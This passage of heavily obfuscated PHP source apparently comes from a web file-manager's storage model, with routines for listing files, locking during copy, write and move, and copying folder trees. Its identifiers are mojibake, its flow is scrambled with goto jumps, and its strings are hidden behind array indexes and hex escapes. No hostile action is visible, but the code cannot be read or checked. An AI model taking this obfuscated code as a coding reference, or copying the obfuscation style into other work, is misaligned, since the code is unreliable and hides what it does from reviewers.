$C†‚Ä‹ñï™[437]); goto cçã«¥µ˜; C¥œÇï°ö: unset($DËĞ¦Ì‘Ò¼); goto D¾Ü¾ŠÔ·‰; cçã«¥µ˜: $C¦•»£…ĞÇ = array_merge($DĞê…ºˆŸ…, $FÉùƒš¯ê); $B»â„Å¸åÇ = Model($C†‚Ä‹ñï™[510])->userListInfo($C¦•»£…ĞÇ); foreach ($bº“ë¿“Ü¡ as &$DËĞ¦Ì‘Ò¼) { $d »ÏˆåÕŒ = $DËĞ¦Ì‘Ò¼[$C†‚Ä‹ñï™[435]]; $DËĞ¦Ì‘Ò¼[$C†‚Ä‹ñï™[435]] = $B»â„Å¸åÇ[$d »ÏˆåÕŒ] ? $B»â„Å¸åÇ[$d »ÏˆåÕŒ] : !1; $d »ÏˆåÕŒ = $DËĞ¦Ì‘Ò¼[$C†‚Ä‹ñï™[437]]; $DËĞ¦Ì‘Ò¼[$C†‚Ä‹ñï™[437]] = $B»â„Å¸åÇ[$d »ÏˆåÕŒ] ? $B»â„Å¸åÇ[$d »ÏˆåÕŒ] : !1; if (isset($DËĞ¦Ì‘Ò¼[$C†‚Ä‹ñï™[448]]) && $DËĞ¦Ì‘Ò¼[$C†‚Ä‹ñï™[448]][$C†‚Ä‹ñï™[511]]) { $B¦‘±øÍ¶ = $GLOBALS[$C†‚Ä‹ñï™[6]][$C†‚Ä‹ñï™[97]][$C†‚Ä‹ñï™[512]]; if ($DËĞ¦Ì‘Ò¼[$C†‚Ä‹ñï™[448]][$C†‚Ä‹ñï™[513]] <= time() - $B¦‘±øÍ¶) { $this->metaSet($DËĞ¦Ì‘Ò¼[$C†‚Ä‹ñï™[399]], $C†‚Ä‹ñï™[511], null); $this->metaSet($DËĞ¦Ì‘Ò¼[$C†‚Ä‹ñï™[399]], $C†‚Ä‹ñï™[513], null); unset($DËĞ¦Ì‘Ò¼[$C†‚Ä‹ñï™[448]][$C†‚Ä‹ñï™[511]]); continue; } $CÊåõâÖ™Ù = $DËĞ¦Ì‘Ò¼[$C†‚Ä‹ñï™[448]][$C†‚Ä‹ñï™[511]]; $DËĞ¦Ì‘Ò¼[$C†‚Ä‹ñï™[448]][$C†‚Ä‹ñï™[514]] = Model($C†‚Ä‹ñï™[510])->getInfoSimpleOuter($CÊåõâÖ™Ù); } } goto C¥œÇï°ö; D¾Ü¾ŠÔ·‰: } public function parentLevelArray($f»„©Éµ“) { $cõ°›Ş¯×„ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $f»„©Éµ“ = explode($cõ°›Ş¯×„[47], trim($f»„©Éµ“, $cõ°›Ş¯×„[47])); return array_remove_value($f»„©Éµ“, $cõ°›Ş¯×„[500]); } public function listAll($Fêå†¾«æÔ) { goto F‘ìÃ›Û°›; bÇ„‘’Äƒö: $F¢äÍÓ¿Ü = array(); foreach ($eğ°‘÷ÇÀ as $E‹˜§‰¿ß => $CÜÖŞ ï‡) { goto CƒóèåÌ²ê; B ƒ³†Ìñª: $bÏÖåƒ Ñ = str_replace($a†Ñ´Ï¾„[499], $a†Ñ´Ï¾„[8], $bÏÖåƒ Ñ); $bÏÖåƒ Ñ = str_replace($a†Ñ´Ï¾„[499], $a†Ñ´Ï¾„[8], $bÏÖåƒ Ñ); $D¥È ö‰æç = array($a†Ñ´Ï¾„[417] => str_replace($a†Ñ´Ï¾„[499], $a†Ñ´Ï¾„[8], $bÏÖåƒ Ñ), $a†Ñ´Ï¾„[521] => intval($CÜÖŞ ï‡[$a†Ñ´Ï¾„[406]]), $a†Ñ´Ï¾„[94] => $this->pathInfoFilter($CÜÖŞ ï‡)); goto e‚«–õ„š†; e‚«–õ„š†: if (!$CÜÖŞ ï‡[$a†Ñ´Ï¾„[406]]) { $D¥È ö‰æç[$a†Ñ´Ï¾„[450]] = $CÜÖŞ ï‡[$a†Ñ´Ï¾„[450]]; $D¥È ö‰æç[$a†Ñ´Ï¾„[95]] = $CÜÖŞ ï‡[$a†Ñ´Ï¾„[85]]; } $F¢äÍÓ¿Ü[] = $D¥È ö‰æç; goto A£ºíÌ‘ä¿; D–ƒò‰ÇŠå: for ($FŠ å´ª­° = 0; $FŠ å´ª­° < count($Cáİ’ËÈ„); $FŠ å´ª­°++) { $bÏÖåƒ Ñ .= $eğ°‘÷ÇÀ[$Cáİ’ËÈ„[$FŠ å´ª­°]][$a†Ñ´Ï¾„[28]] . $a†Ñ´Ï¾„[8]; } $bÏÖåƒ Ñ .= $CÜÖŞ ï‡[$a†Ñ´Ï¾„[28]]; if ($CÜÖŞ ï‡[$a†Ñ´Ï¾„[406]]) { $bÏÖåƒ Ñ .= $a†Ñ´Ï¾„[8]; } goto B ƒ³†Ìñª; CƒóèåÌ²ê: $Cáİ’ËÈ„ = $this->parentLevelArray($CÜÖŞ ï‡[$a†Ñ´Ï¾„[490]]); array_shift($Cáİ’ËÈ„); $bÏÖåƒ Ñ = $f•ÜÌ©ÜåÏ; goto D–ƒò‰ÇŠå; A£ºíÌ‘ä¿: } return $F¢äÍÓ¿Ü; goto e«à¿„‰; D‚¢›‰µó×: $b¯ğ„–òÎ = $a†Ñ´Ï¾„[519]; $f±×†åÖ›  = "\114\105\x46\x54\x20\112\x4f\x49\116\x20{$this->tablePrefix}\x69\x6f\137\x66\x69\154\x65\x20\x66\151\x6c\145\40\157\156\40\x73\157\x75\x72\143\145\x2e\x66\x69\x6c\x65\x49\104\40\75\x20\146\151\x6c\x65\56\x66\151\154\145\111\x44"; $eğ°‘÷ÇÀ = $this->alias($a†Ñ´Ï¾„[520])->field($b¯ğ„–òÎ)->where($D‚™âÒÕ•)->join($f±×†åÖ› )->select(); goto DÙåšíšƒ’; DÙåšíšƒ’: $this->_listAppendAuth($eğ°‘÷ÇÀ); $this->_listAppendUser($eğ°‘÷ÇÀ); $this->_listAppendPath($eğ°‘÷ÇÀ); goto C²„ÉÄÛ¼ó; C²„ÉÄÛ¼ó: $eğ°‘÷ÇÀ = array_to_keyvalue($eğ°‘÷ÇÀ, $a†Ñ´Ï¾„[399]); $f•ÜÌ©ÜåÏ = "\57{$Aô•Ö”ßâ[$a†Ñ´Ï¾„[28]]}\57"; $f•ÜÌ©ÜåÏ = $f•ÜÌ©ÜåÏ == $a†Ñ´Ï¾„[499] ? $a†Ñ´Ï¾„[8] : $f•ÜÌ©ÜåÏ; goto bÇ„‘’Äƒö; F‘ìÃ›Û°›: $a†Ñ´Ï¾„ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Aô•Ö”ßâ = $this->sourceInfo($Fêå†¾«æÔ); $D‚™âÒÕ• = array($a†Ñ´Ï¾„[515] => array($a†Ñ´Ï¾„[516], $Aô•Ö”ßâ[$a†Ñ´Ï¾„[490]] . $Fêå†¾«æÔ . $a†Ñ´Ï¾„[517]), $a†Ñ´Ï¾„[518] => 0); goto D‚¢›‰µó×; e«à¿„‰: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($b“¢õœ„óö) { goto dšÃ«¨²Õ; dšÃ«¨²Õ: $DÖÅÃ÷ºÓ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$this->allowLock()) { return; } $this->_lockCheck($DÖÅÃ÷ºÓ[522], $b“¢õœ„óö); goto FÔ›¯“‰±…; d™É¯ê»ø: $this->_lockEvent($b“¢õœ„óö, array($DÖÅÃ÷ºÓ[525], $DÖÅÃ÷ºÓ[526]), $AØ”‹æà¤™); $this->_lockCheckEnd($DÖÅÃ÷ºÓ[522], $b“¢õœ„óö); goto f×±ìÂïä“; FÔ›¯“‰±…: $AØ”‹æà¤™ = 1; $this->_lockEvent($b“¢õœ„óö, array($DÖÅÃ÷ºÓ[523], $DÖÅÃ÷ºÓ[524]), $AØ”‹æà¤™); $this->_lockParent($b“¢õœ„óö, array($DÖÅÃ÷ºÓ[524]), $AØ”‹æà¤™); goto d™É¯ê»ø; f×±ìÂïä“: } public function lockCopyEnd($AÁ½†Š‡õç) { $d‘ùêÜ„ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$this->allowLock()) { return; } $b©…ÖÖÃµ = 0; $this->_lockEvent($AÁ½†Š‡õç, array($d‘ùêÜ„[523], $d‘ùêÜ„[524]), $b©…ÖÖÃµ); $this->_lockParent($AÁ½†Š‡õç, array($d‘ùêÜ„[524]), $b©…ÖÖÃµ); $this->_lockEvent($AÁ½†Š‡õç, array($d‘ùêÜ„[525], $d‘ùêÜ„[526]), $b©…ÖÖÃµ); } public function lockWriteStart($B•‚˜´òëì, $C„©Ù¼³”æ = '') { goto f‡©Á¼¼Ï; f‡©Á¼¼Ï: $fµãİŸ’¥ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$this->allowLock()) { return; } $this->_lockCheck($fµãİŸ’¥[523], $B•‚˜´òëì); goto fŒ¹Îâ…ß; fŒ¹Îâ…ß: $f…ÎëİÉÎ = 1; $this->_lockKey($fµãİŸ’¥[527] . $B•‚˜´òëì . $fµãİŸ’¥[104] . $C„©Ù¼³”æ, $f…ÎëİÉÎ); $this->_lockEvent($B•‚˜´òëì, array($fµãİŸ’¥[522], $fµãİŸ’¥[524]), $f…ÎëİÉÎ); goto bÕ¾õ¤”œ¥; bÕ¾õ¤”œ¥: $this->_lockParent($B•‚˜´òëì, array($fµãİŸ’¥[522], $fµãİŸ’¥[524]), $f…ÎëİÉÎ); $this->_lockCheckEnd($fµãİŸ’¥[523], $B•‚˜´òëì); goto EĞÄê†‚¥²; EĞÄê†‚¥²: } public function lockWriteEnd($aÒî®ï¥‚¾, $f©Ûáœ£½„ = '') { $BóÁ©”ëè¢ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$this->allowLock()) { return; } $EâÄ®µØèß = 0; $this->_lockKey($BóÁ©”ëè¢[527] . $aÒî®ï¥‚¾ . $BóÁ©”ëè¢[104] . $f©Ûáœ£½„, $EâÄ®µØèß); $this->_lockEvent($aÒî®ï¥‚¾, array($BóÁ©”ëè¢[522], $BóÁ©”ëè¢[524]), $EâÄ®µØèß); $this->_lockParent($aÒî®ï¥‚¾, array($BóÁ©”ëè¢[522], $BóÁ©”ëè¢[524]), $EâÄ®µØèß); } public function lockMoveStart($díº¶ëËÑ¼) { goto a©æÉ†ñËØ; a©æÉ†ñËØ: $cî½„ÒÜ¯„ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$this->allowLock()) { return; } $this->_lockCheck($cî½„ÒÜ¯„[524], $díº¶ëËÑ¼); goto BôÓæä…Ô; BôÓæä…Ô: $A‰Áöô½‘ô = 1; $this->_lockKey($cî½„ÒÜ¯„[528] . $díº¶ëËÑ¼, $A‰Áöô½‘ô); $this->_lockEvent($díº¶ëËÑ¼, array($cî½„ÒÜ¯„[522], $cî½„ÒÜ¯„[523]), $A‰Áöô½‘ô); goto E¸ÈÊ½·èÔ; E¸ÈÊ½·èÔ: $this->_lockParent($díº¶ëËÑ¼, array($cî½„ÒÜ¯„[522], $cî½„ÒÜ¯„[524]), $A‰Áöô½‘ô); $this->_lockEvent($díº¶ëËÑ¼, array($cî½„ÒÜ¯„[529], $cî½„ÒÜ¯„[525], $cî½„ÒÜ¯„[526]), $A‰Áöô½‘ô); $this->_lockCheckEnd($cî½„ÒÜ¯„[524], $díº¶ëËÑ¼); goto f‘»ÎÜµøö; f‘»ÎÜµøö: } public function lockMoveEnd($Cë ¼¨±î) { goto f††ñ°ªÕØ; f††ñ°ªÕØ: $e‹¯…éñê =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$this->allowLock()) { return; } $dˆóëïÈåˆ = 0; goto CÌæ¯ˆ¤¬Í; CÌæ¯ˆ¤¬Í: $this->_lockKey($e‹¯…éñê[528] . $Cë ¼¨±î, $dˆóëïÈåˆ); $this->_lockEvent($Cë ¼¨±î, array($e‹¯…éñê[522], $e‹¯…éñê[523]), $dˆóëïÈåˆ); $this->_lockParent($Cë ¼¨±î, array($e‹¯…éñê[522], $e‹¯…éñê[524]), $dˆóëïÈåˆ); goto E¶èÆëÏ¦; E¶èÆëÏ¦: $this->_lockEvent($Cë ¼¨±î, array($e‹¯…éñê[529], $e‹¯…éñê[525], $e‹¯…éñê[526]), $dˆóëïÈåˆ); goto bèßâµì; bèßâµì: } private function _lockCheck($CõÕ£«³, $A°¡¾ùëÌ–) { goto dİÖ”¨Ä”; eÂ²¶ÕÖ‰Ÿ: $this->_lockTimeStart[$Eá¬Â½„›] = timeFloat(); if (!is_array($B¬îçËìò±)) { return; } $eï‡¬Àœ„£ = LNG($Dğø¿Îø˜ƒ[530]); goto B„‚×•“¨; dİÖ”¨Ä”: $Dğø¿Îø˜ƒ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $B¬îçËìò± = $this->sourceInfo($A°¡¾ùëÌ–); $Eá¬Â½„› = $CõÕ£«³ . $Dğø¿Îø˜ƒ[104] . $A°¡¾ùëÌ–; goto eÂ²¶ÕÖ‰Ÿ; FÏñ Èá‰Š: $eĞÇ¸ßœˆ‘ = array_reverse($this->parentLevelArray($B¬îçËìò±[$Dğø¿Îø˜ƒ[490]])); foreach ($eĞÇ¸ßœˆ‘ as $E„õ¼¦İ»¦) { $Eá¬Â½„› = $CõÕ£«³ . $Dğø¿Îø˜ƒ[531] . $E„õ¼¦İ»¦; if (CacheLock::lockGet($Dğø¿Îø˜ƒ[532] . $Eá¬Â½„›)) { $B¬îçËìò± = $this->sourceInfo($E„õ¼¦İ»¦); CacheLock::setErrorMsg($Dğø¿Îø˜ƒ[169] . htmlspecialchars($B¬îçËìò±[$Dğø¿Îø˜ƒ[28]]) . $Dğø¿Îø˜ƒ[508] . $eï‡¬Àœ„£); $this->_lockKey($Eá¬Â½„›, 1); $this->_lockKey($Eá¬Â½„›, 0); } } goto b¶µ¥ÙñİØ; B„‚×•“¨: CacheLock::setErrorMsg($Dğø¿Îø˜ƒ[169] . htmlspecialchars($B¬îçËìò±[$Dğø¿Îø˜ƒ[28]]) . $Dğø¿Îø˜ƒ[508] . $eï‡¬Àœ„£); $this->_lockKey($Eá¬Â½„›, 1); $this->_lockKey($Eá¬Â½„›, 0); goto FÏñ Èá‰Š; b¶µ¥ÙñİØ: } private function _lockCheckEnd($aã¿—’“¦¨, $CĞ•ë•Í‡) { goto C²ß¹â‹Ù•; C²ß¹â‹Ù•: $aœçƒêÓˆ« =& $_SERVER[í¤âËÚ£¶íÊ¢]; $DÓ­ÇÔÕ‹‚ = $aã¿—’“¦¨ . $aœçƒêÓˆ«[104] . $CĞ•ë•Í‡; CacheLock::setErrorMsg($aœçƒêÓˆ«[360]); goto c¶òÆ´‡¿Ÿ; c¶òÆ´‡¿Ÿ: if (!isset($this->_lockTimeStart[$DÓ­ÇÔÕ‹‚])) { return; } $a·ƒåÙ˜Ûš = timeFloat() - $this->_lockTimeStart[$DÓ­ÇÔÕ‹‚]; unset($this->_lockTimeStart[$DÓ­ÇÔÕ‹‚]); goto bŒ¬‘İ½®Ä; bŒ¬‘İ½®Ä: if ($a·ƒåÙ˜Ûš > 0.5) { unset(self::$cacheSourceInfo[$aœçƒêÓˆ«[441] . $CĞ•ë•Í‡]); } $D÷’óÀ¤ = $this->sourceInfo($CĞ•ë•Í‡); if (!$D÷’óÀ¤) { show_json(LNG($aœçƒêÓˆ«[114]), !1); } goto e½›òĞ‡İ; e½›òĞ‡İ: } private function _lockParent($b–ò£ÆÎ¥, $Bé™Ô¸ºÍ, $e’ÑÏˆŒÒÀ) { if (!$this->autoLockSet) { return; } $fØ÷ÇÙ”ä = $this->sourceInfo($b–ò£ÆÎ¥); if (!is_array($fØ÷ÇÙ”ä)) { return; } $FÔ“õ÷ƒ†± = array_reverse($this->parentLevelArray($fØ÷ÇÙ”ä[$_SERVER[í¤âËÚ£¶íÊ¢][490]])); foreach ($FÔ“õ÷ƒ†± as $eÊªÀ¯±ƒ) { $this->_lockEvent($eÊªÀ¯±ƒ, $Bé™Ô¸ºÍ, $e’ÑÏˆŒÒÀ); } } private function _lockEvent($e Ì¾ƒ¦±, $eê¸É‹Çª˜, $DÜ¶ÍµÕà) { $bƒ¡òÒíÇÖ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$this->autoLockSet) { return; } foreach ($eê¸É‹Çª˜ as $CŠ©šßí›³) { $F®èŞ¢­ñß = $CŠ©šßí›³ . $bƒ¡òÒíÇÖ[104] . $e Ì¾ƒ¦±; if ($DÜ¶ÍµÕà && CacheLock::lockGet($bƒ¡òÒíÇÖ[532] . $F®èŞ¢­ñß)) { continue; } $this->_lockKey($F®èŞ¢­ñß, $DÜ¶ÍµÕà); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($FÄ¢‰¯ Ğ™, $F”’ùÛƒßŠ = 1) { $A—«Ìˆ÷ºÈ = $_SERVER[í¤âËÚ£¶íÊ¢][532] . md5($FÄ¢‰¯ Ğ™); if ($F”’ùÛƒßŠ) { if (isset(self::$_lockItemArr[$A—«Ìˆ÷ºÈ])) { return; } self::$_lockItemArr[$A—«Ìˆ÷ºÈ] = 1; CacheLock::lock($A—«Ìˆ÷ºÈ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$A—«Ìˆ÷ºÈ])) { return; } unset(self::$_lockItemArr[$A—«Ìˆ÷ºÈ]); CacheLock::unlock($A—«Ìˆ÷ºÈ); } } public function isParentOf($aİôŞˆÑ, $AŸÂäé§¨²) { goto b†ßŸ; EïôóÚÄ: return $dÅÚ…Õë¬¼; goto eŒ±è¤˜–ì; d•ÈÎŒö: $EÚÈãÕÚŞË = $dŠ‘ô«ÈŠ[$aÈ„°ñáŒá[490]] . $dŠ‘ô«ÈŠ[$aÈ„°ñáŒá[399]] . $aÈ„°ñáŒá[47]; $aƒ£¹™ğØ‡ = $c»ÃÓ¼”Öê[$aÈ„°ñáŒá[490]] . $c»ÃÓ¼”Öê[$aÈ„°ñáŒá[399]] . $aÈ„°ñáŒá[47]; $dÅÚ…Õë¬¼ = strpos($aƒ£¹™ğØ‡, $EÚÈãÕÚŞË) === 0; goto EïôóÚÄ; b†ßŸ: $aÈ„°ñáŒá =& $_SERVER[í¤âËÚ£¶íÊ¢]; $dŠ‘ô«ÈŠ = $this->sourceInfo($aİôŞˆÑ); $c»ÃÓ¼”Öê = $this->sourceInfo($AŸÂäé§¨²); goto d•ÈÎŒö; eŒ±è¤˜–ì: } private $targetIsDelete = 0; public function copy($E‡Ó‚É»¯, $FáÆËËÂá†, $A‡Âåàµ‹¥ = REPEAT_REPLACE, $F­ì£Î¬‰¿ = '') { goto cÄõê®„˜§; cÄõê®„˜§: $D¤×Å†¬›ë =& $_SERVER[í¤âËÚ£¶íÊ¢]; $DÄå‡Î”éì = $this->sourceInfo($E‡Ó‚É»¯); $Dçê´ë·Ÿƒ = $this->sourceInfo($FáÆËËÂá†); goto CÊ¢Ö†Óù; DÙ†Ş¸‘›É: $this->lockCopyStart($E‡Ó‚É»¯); $this->lockWriteStart($FáÆËËÂá†, $Cç‰Á¢ÎÁ‘); $a¢øï–Ãçµ = array($D¤×Å†¬›ë[533] => array(), $D¤×Å†¬›ë[534] => array(), $D¤×Å†¬›ë[535] => array()); goto BôÓå·ã›ä; f§àÅšÇÄ‹: $this->updateModifyTime($FáÆËËÂá†); return $DçÃøèËÖ¸; goto aŞ—¿™Íšù; CÊ¢Ö†Óù: if (!$DÄå‡Î”éì || !$Dçê´ë·Ÿƒ || $Dçê´ë·Ÿƒ[$D¤×Å†¬›ë[406]] != $D¤×Å†¬›ë[96]) { return !1; } if ($this->isParentOf($E‡Ó‚É»¯, $FáÆËËÂá†)) { return !1; } $Cç‰Á¢ÎÁ‘ = $F­ì£Î¬‰¿ ? $F­ì£Î¬‰¿ : $DÄå‡Î”éì[$D¤×Å†¬›ë[28]]; goto DÙ†Ş¸‘›É; FÉ£÷óÉ§ì: $this->_childrenListClear(); $this->lockCopyEnd($E‡Ó‚É»¯); $this->lockWriteEnd($FáÆËËÂá†, $Cç‰Á¢ÎÁ‘); goto B®¬†ëİÀ; BôÓå·ã›ä: $this->targetIsDelete = intval($DÄå‡Î”éì[$D¤×Å†¬›ë[426]]); $cš­æà‰ˆ« = $this->fileNameExistCache($FáÆËËÂá†, $DÄå‡Î”éì[$D¤×Å†¬›ë[28]]); $DçÃøèËÖ¸ = $this->_copy($E‡Ó‚É»¯, $FáÆËËÂá†, $A‡Âåàµ‹¥, $a¢øï–Ãçµ, !0, $F­ì£Î¬‰¿); goto FÉ£÷óÉ§ì; B®¬†ëİÀ: if ($DÄå‡Î”éì[$D¤×Å†¬›ë[406]] == $D¤×Å†¬›ë[96] && $cš­æà‰ˆ« == $DçÃøèËÖ¸) { $this->folderSizeResetChildren($cš­æà‰ˆ«); } Model($D¤×Å†¬›ë[536])->addAll($a¢øï–Ãçµ[$D¤×Å†¬›ë[534]], array(), !0); if ($cš­æà‰ˆ« != $DçÃøèËÖ¸ || $DÄå‡Î”éì[$D¤×Å†¬›ë[406]] == $D¤×Å†¬›ë[96]) { Model($D¤×Å†¬›ë[537])->eventCopy($DçÃøèËÖ¸); } goto F¯Ò±ÇöÌâ; F¯Ò±ÇöÌâ: $this->saveAll($a¢øï–Ãçµ[$D¤×Å†¬›ë[535]]); Model($D¤×Å†¬›ë[201])->linkAdd($a¢øï–Ãçµ[$D¤×Å†¬›ë[533]]); $this->folderSizeReset($FáÆËËÂá†); goto f§àÅšÇÄ‹; aŞ—¿™Íšù: } private function _copy($e¥Åß­ ò™, $Fóøš¦±ÓË, $bÈ…ÓÛÌŸ­, &$cÏÓËŒËó, $Eöîô³‰¯Ò, $F˜ÁÂ“âÕ• = '') { goto cï§òò×ÖŠ; cï§òò×ÖŠ: $c°„„ÙÁÜ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $C´ÖÅÉ¤’Ä = $this->sourceInfoCache($e¥Åß­ ò™); $AĞÀëì„Æ = $C´ÖÅÉ¤’Ä[$c°„„ÙÁÜ[406]] == $c°„„ÙÁÜ[96]; goto bä–ŸÒ‰ß; b‰ˆñó˜Ã: return $dî„…‡À¢; goto f‡ÕõŸæì; bä–ŸÒ‰ß: $cËŞ‚ƒ‚ = $F˜ÁÂ“âÕ• ? $F˜ÁÂ“âÕ• : $C´ÖÅÉ¤’Ä[$c°„„ÙÁÜ[28]]; $C¦ç‚ŠÁõ = $this->fileNameExistCache($Fóøš¦±ÓË, $cËŞ‚ƒ‚); if ($Eöîô³‰¯Ò) { $this->_childrenAllMake($e¥Åß­ ò™); if ($AĞÀëì„Æ && $C¦ç‚ŠÁõ) { $this->_childrenAllMake($C¦ç‚ŠÁõ); } } goto bÓ¨ÖÇª; bÓ¨ÖÇª: if (!$C¦ç‚ŠÁõ) { return $this->_copyCreate($e¥Åß­ ò™, $Fóøš¦±ÓË, $cËŞ‚ƒ‚, $cÏÓËŒËó); } $dî„…‡À¢ = $C¦ç‚ŠÁõ; if ($AĞÀëì„Æ) { if ($bÈ…ÓÛÌŸ­ == REPEAT_RENAME_FOLDER) { $cËŞ‚ƒ‚ = $this->fileNameAutoCache($Fóøš¦±ÓË, $cËŞ‚ƒ‚, $bÈ…ÓÛÌŸ­, $AĞÀëì„Æ); $dî„…‡À¢ = $this->_copyCreate($e¥Åß­ ò™, $Fóøš¦±ÓË, $cËŞ‚ƒ‚, $cÏÓËŒËó); } else { $AŒ¹Á¾Íí = $this->_childrenList($e¥Åß­ ò™); foreach ($AŒ¹Á¾Íí as $B¨È¦Šå‡µ) { $this->_copy($B¨È¦Šå‡µ[$c°„„ÙÁÜ[399]], $C¦ç‚ŠÁõ, $bÈ…ÓÛÌŸ­, $cÏÓËŒËó, !1); } } } else { if ($bÈ…ÓÛÌŸ­ == REPEAT_RENAME || $bÈ…ÓÛÌŸ­ == REPEAT_RENAME_FOLDER) { $cËŞ‚ƒ‚ = $this->fileNameAutoCache($Fóøš¦±ÓË, $cËŞ‚ƒ‚, $bÈ…ÓÛÌŸ­, $AĞÀëì„Æ); $dî„…‡À¢ = $this->_copyCreate($e¥Åß­ ò™, $Fóøš¦±ÓË, $cËŞ‚ƒ‚, $cÏÓËŒËó); } else { if ($bÈ…ÓÛÌŸ­ == REPEAT_REPLACE) { $e•¦¢‹¢• = $this->sourceInfoCache($C¦ç‚ŠÁõ); $f–Í†ÄÒó = $this->fileHistory($e•¦¢‹¢•, $C´ÖÅÉ¤’Ä[$c°„„ÙÁÜ[450]], $C´ÖÅÉ¤’Ä[$c°„„ÙÁÜ[87]]); if ($f–Í†ÄÒó) { $cÏÓËŒËó[$c°„„ÙÁÜ[533]][] = $C´ÖÅÉ¤’Ä[$c°„„ÙÁÜ[450]]; } } else { if ($bÈ…ÓÛÌŸ­ == REPEAT_SKIP) { } } } Hook::trigger($c°„„ÙÁÜ[538], array($c°„„ÙÁÜ[539], $C´ÖÅÉ¤’Ä, 0)); } goto b‰ˆñó˜Ã; f‡ÕõŸæì: } private function _copyCreate($d™ˆÛ¿™Ğ˜, $cå¤¥Íº“¿, $CÙ˜„äÄ¥, &$e¼†®ÛËóê) { goto eâÛŸİãĞÓ; E‹ «æŸŠÎ: $d¬¼–ƒØä[$d™ˆÛ¿™Ğ˜] = $dšÛİˆ¾¾ß; $e­¾¸—’·Á = array(); $aÂ•³ğ‰Ï´ = array(); goto aÕëäƒ Æğ; bñŒ¸¡—•Å: $this->_childrenListAll($d™ˆÛ¿™Ğ˜, $EÜ¼ºèÍ±ã); $fÍÊœÄ±ƒ‡ = count($EÜ¼ºèÍ±ã); if ($fÍÊœÄ±ƒ‡ == 0) { return $dšÛİˆ¾¾ß; } goto bá­›“Œø; då”´³÷‡í: $this->addAll($aø’Ã¶¿ÛÂ, array(), !1); $f³å—ÇˆÂ = $this->where(array($C‹‚Ê³«ˆì[481] => $dšÛİˆ¾¾ß))->select(); $d¬¼–ƒØä = $this->_childrenMakeRelation($EÜ¼ºèÍ±ã, $f³å—ÇˆÂ); goto E‹ «æŸŠÎ; aÕëäƒ Æğ: foreach ($f³å—ÇˆÂ as $f°Öñ­Ï¿) { $cã†›ÃŸÈ = $f°Öñ­Ï¿[$C‹‚Ê³«ˆì[399]]; $c©¶ŠëŒÛ· = $this->_childrenMatch($d¬¼–ƒØä, $f°Öñ­Ï¿, $eáœ—Ûøã‰); $e­¾¸—’·Á[] = array($C‹‚Ê³«ˆì[399], $cã†›ÃŸÈ, $C‹‚Ê³«ˆì[481], $c©¶ŠëŒÛ·[$C‹‚Ê³«ˆì[481]]); $aÂ•³ğ‰Ï´[] = array($C‹‚Ê³«ˆì[399], $cã†›ÃŸÈ, $C‹‚Ê³«ˆì[490], $c©¶ŠëŒÛ·[$C‹‚Ê³«ˆì[490]]); $this->_copyApplyMeta($f°Öñ­Ï¿, $e¼†®ÛËóê); if ($f°Öñ­Ï¿[$C‹‚Ê³«ˆì[406]] != $C‹‚Ê³«ˆì[96]) { $e¼†®ÛËóê[$C‹‚Ê³«ˆì[533]][] = $f°Öñ­Ï¿[$C‹‚Ê³«ˆì[450]]; } } $this->chunkEventSet($C‹‚Ê³«ˆì[545], array($C‹‚Ê³«ˆì[546], $E¶›§½ÕßÔ, $fÍÊœÄ±ƒ‡)); $this->saveAll($e­¾¸—’·Á); goto fêÄôÒ®á™; A¿¼¨‰ê: if ($dî«¬²õƒœ[$C‹‚Ê³«ˆì[406]] != $C‹‚Ê³«ˆì[96]) { $e¼†®ÛËóê[$C‹‚Ê³«ˆì[533]][] = $dî«¬²õƒœ[$C‹‚Ê³«ˆì[450]]; return $dšÛİˆ¾¾ß; } $EÜ¼ºèÍ±ã = array(); $aø’Ã¶¿ÛÂ = array(); goto bñŒ¸¡—•Å; EÔ’ğãŞ³Æ: $dšÛİˆ¾¾ß = $this->add($E¶›§½ÕßÔ); $CİÌà¹Şº = array($C‹‚Ê³«ˆì[399] => $dšÛİˆ¾¾ß, $C‹‚Ê³«ˆì[28] => $CÙ˜„äÄ¥); $this->_copyApplyMeta($CİÌà¹Şº, $e¼†®ÛËóê); goto A¿¼¨‰ê; bá­›“Œø: $eáœ—Ûøã‰ = $this->sourceInfo($dšÛİˆ¾¾ß); foreach ($EÜ¼ºèÍ±ã as $f°Öñ­Ï¿) { $b¦Ÿ¨¶óœ³ = $this->_makeItemData($f°Öñ­Ï¿, $eáœ—Ûøã‰, $f°Öñ­Ï¿[$C‹‚Ê³«ˆì[28]]); $b¦Ÿ¨¶óœ³[$C‹‚Ê³«ˆì[490]] = $f°Öñ­Ï¿[$C‹‚Ê³«ˆì[490]]; $aø’Ã¶¿ÛÂ[] = $b¦Ÿ¨¶óœ³; } $this->chunkEventSet($C‹‚Ê³«ˆì[543], array($C‹‚Ê³«ˆì[544], $E¶›§½ÕßÔ, $fÍÊœÄ±ƒ‡)); goto då”´³÷‡í; bĞÀŠŒÊÌ­: $E¶›§½ÕßÔ = $this->_makeItemData($dî«¬²õƒœ, $d†¬†„­ƒÍ, $CÙ˜„äÄ¥); Hook::trigger($C‹‚Ê³«ˆì[540], $E¶›§½ÕßÔ); Hook::trigger($C‹‚Ê³«ˆì[541], array($C‹‚Ê³«ˆì[542], $E¶›§½ÕßÔ, 0)); goto EÔ’ğãŞ³Æ; eâÛŸİãĞÓ: $C‹‚Ê³«ˆì =& $_SERVER[í¤âËÚ£¶íÊ¢]; $dî«¬²õƒœ = $this->sourceInfoCache($d™ˆÛ¿™Ğ˜); $d†¬†„­ƒÍ = $this->sourceInfoCache($cå¤¥Íº“¿); goto bĞÀŠŒÊÌ­; fêÄôÒ®á™: $this->chunkEventSet($C‹‚Ê³«ˆì[547], array($C‹‚Ê³«ˆì[548], $E¶›§½ÕßÔ, $fÍÊœÄ±ƒ‡)); 